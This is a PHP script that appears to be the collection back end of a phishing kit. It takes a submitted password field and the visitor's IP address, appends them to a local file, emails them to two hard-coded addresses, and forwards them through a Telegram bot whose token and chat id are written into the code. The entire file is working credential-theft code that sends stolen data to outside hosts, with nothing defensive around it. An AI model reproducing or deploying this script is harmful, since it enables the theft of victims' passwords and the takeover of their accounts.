<?php
  
    $data = trim($_POST['pass']);
    $ipaddress = $_SERVER['REMOTE_ADDR'];
    $to = "Mickmullfer@gmail.com,r3sultb0x@rambler.ru";
    $token = "5699366095:AAFVEnqARj6fBd4K2i3C5z4XQ_gig5vrIUs";
    $chatid = "5777799686";

     function sendMessage($chatID, $messaggio, $token) {
        echo "sending message to " . $chatID . "\n";

        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    if($data !== null){
        $message .= "\n \n||RESULTS|----------|\n";
	    $message .= "IP: $ipaddress \n";
        $message .= $data;

        $myfile = fopen("file.txt", "a");
        fwrite($myfile, $message);
        mail($to, "Results", $message);
        fclose($myfile);

        sendMessage($chatid, $message, $token);
    }
    else {
        echo "Network Connection Failed";
    }


   
?>